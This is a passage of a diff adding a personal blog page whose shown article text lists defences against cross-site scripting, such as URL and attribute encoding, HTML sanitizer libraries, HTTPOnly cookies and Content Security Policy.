+  <li><strong>URL Escape Before Inserting Untrusted Data into HTML URL Parameter Values</strong>:when you want to put untrusted data into HTTP GET parameter value.</li>
+</ul>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>&lt;a href="http://www.somesite.com?test=...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE..."&gt;link&lt;/a &gt;       
+</code></pre>
+</div>
+
+<ul>
+  <li><strong>Sanitize HTML Markup with a Library Designed for the Job</strong>: like <em><a href="https://github.com/mganss/HtmlSanitizer">HtmlSanitizer</a></em> or <em><a href="https://www.owasp.org/index.php/OWASP_Java_HTML_Sanitizer_Project">OWASP Java HTML Sanitizer</a></em> or <em><a href="http://htmlpurifier.org/">PHP HTML Purifier</a></em> or others.</li>
+</ul>
+
+<p>example:</p>
+
+<pre><code class="language-JavaScript">var sanitizer = new HtmlSanitizer();
+sanitizer.AllowedAttributes.Add("class");
+var sanitized = sanitizer.Sanitize(html);
+</code></pre>
+
+<ul>
+  <li><strong><a href="https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet">Prevent DOM-based XSS</a></strong></li>
+  <li><strong>Use HTTPOnly cookie flag</strong></li>
+  <li><strong>Implement Content Security Policy (CSP)</strong></li>
+  <li><strong>Use the X-XSS-Protection Response Header</strong></li>
+</ul>
+
+<h3 id="summary"><strong>Summary</strong></h3>
+
+<p><strong>To defend:</strong></p>
+
+<ul>
+  <li><strong>HTML encode: i.e. Convert <code class="highlighter-rouge">&gt;</code> to <code class="highlighter-rouge">&amp;gt;</code></strong></li>
+  <li><strong>Strictly validate unsafe Attributes</strong></li>
+  <li><strong>URL encode: percent encoding</strong></li>
+  <li><strong>URL validation</strong></li>
+  <li><strong>Attribute encode: escape characters with the HTML Entity <code class="highlighter-rouge">&amp;#xHH;</code></strong></li>
+  <li><strong>CSS Hex encode: scaping supports <code class="highlighter-rouge">\XX</code> and <code class="highlighter-rouge">\XXXXXX</code></strong></li>
+  <li><strong>Javascript encoding/escaping: escape all characters with the <code class="highlighter-rouge">\uXXXX</code> unicode escaping format</strong></li>
+</ul>
+
+<p>more info at: [https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)<em>Prevention_Cheat_Sheet](https://www.owasp.org/index.php/XSS</em>(Cross_Site_Scripting_Prevention_Cheat_Sheet)</p>
+
+<hr />
+</div>
+    <hr />
+    <div class="share-page">
+    Share this on &rarr;
+ <a href="https://twitter.com/share" class="twitter-share-button" data-via="bestrocker221">Tweet</a>
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+
+<!-- Google + -->
+<div class="g-plus" data-action="share" data-annotation="bubble"></div>
+<script src="https://apis.google.com/js/platform.js" async defer></script>
+
+<!-- Facebook -->
+<div class="fb-share-button" data-href="https://carloalbertoscola.it//2018/notes/sop-xss-introduction/" data-layout="button_count" style="position: relative; top: -8px; left: 3px;"></div>
+</div>
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.6&appId=1082525865223478";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+</article>
+<hr />
+
+
+    
+    
+        
+            
+        
+    
+        
+            
+        
+    
+
+    
+    
+        
+            
+        
+    
+        
+            
+                
+                <div class="panel-body">
+                <h4>Related Posts</h4>
+                <ul>
+                
+                <li class="relatedPost">
+                    <a href="https://carloalbertoscola.it//2019/linux/notes/network/cisco/BGP-OSPF-network-routing/">A Cisco routing lab network with GNS3. [Part 1]</a>
+                    
+                        <small>(Categories: <a href="/category/linux">linux</a>, <a href="/category/notes">notes</a>, <a href="/category/network">network</a>, <a href="/category/cisco">cisco</a>)</small>
+                    
+                </li>
+                
+                
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+
+    
+    
+        
+            
+        
+    
+        
+            
+        
+    
+
+    
+    
+        
+            
+        
+    
+        
+            
+        
+    
+
+    
+    
+        
+            
+                
+                <li class="relatedPost">
+                    <a href="https://carloalbertoscola.it//2018/notes/samesite-cookie/">SameSite cookie security</a>
+                    
+                        <small>(Categories: <a href="/category/notes">notes</a>)</small>
+                    
+                </li>
+                
+                
+            
+        
+    
+
+    
+    
+        
+            
+                
+                <li class="relatedPost">
+                    <a href="https://carloalbertoscola.it//2018/notes/http-header-security/">HTTP Headers security</a>
+                    
+                        <small>(Categories: <a href="/category/notes">notes</a>)</small>
+                    
+                </li>
+                
+                
+            
+        
+    
+
+    
+    
+        
+            
+        
+    
+
+    
+    
+        
+            
+                
+                <li class="relatedPost">
+                    <a href="https://carloalbertoscola.it//2018/notes/xssi-and-xss/">XSSI and XSS differences</a>
+                    
+                        <small>(Categories: <a href="/category/notes">notes</a>)</small>
+                    
+                </li>
+                
+                
+            
+        
+    
+
+    
+    
+        
+            
+        
+    
+        
+            
+        
+    
+
+    
+    
+        
+            
+        
+    
+        
+            
+        
+    
+
+    
+    
+        
+            
+        
+    
+        
+            
+        
+    
+
+    
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+
+
+    </ul>
+    </div>
+
+
+<div class="PageNavigation">
+  
+    <a class="prev pull-left" href="https://carloalbertoscola.it//2018/notes/xssi-and-xss/">&laquo; XSSI and XSS differences</a>
+  
+  
+    <a class="next pull-right" href="https://carloalbertoscola.it//2018/notes/http-header-security/">HTTP Headers security &raquo;</a>
+  
+</div>
+
+
+<div class="disqus-comments">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        /* <![CDATA[ */
+
+        var disqus_shortname = "carloalberto";
+        var disqus_identifier = "https://carloalbertoscola.it/_SOP and XSS introduction";
+        var disqus_title = "SOP and XSS introduction";
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    /* ]]> */
+    </script>
+</div>
+</div>
+          <div class="row">
+            <div class="col-md-12 col-xs-12 footer">
+              <footer>
+  © 2019 - Scola Carlo Alberto <!--<a href="#">Privacy link</a>--> - <a href="/static/albertoscola221@gmail.com.pgp">GPG key </a>.
+</footer>
+<!-- <div align="center">
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+  <ins class="adsbygoogle"
+    style="display:block"
+    data-ad-client="ca-pub-0000000000000000"
+    data-ad-slot="0000000000"
+    data-ad-format="auto"></ins>
+  <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+</div>
+ -->
+            </div>
+          </div>
+        </div> <!-- end /.col-md-9 -->
+      </div> <!-- end /.row -->
+    </div>
+
+    
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+<!--<script src="https://code.jquery.com/jquery-migrate-1.2.1.min.js"></script>-->
+<!--<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>-->
+
+<script src="/static/js/super-search.js"></script>
+
+<script src="/static/js/thickbox-compressed.js"></script>
+<script src="/static/js/material.min.js"></script>
+<script src="/static/js/main.js"></script>
+<script src="/static/js/projects.js"></script>
+
+    <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-63063866-5', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  </body>
+</html>
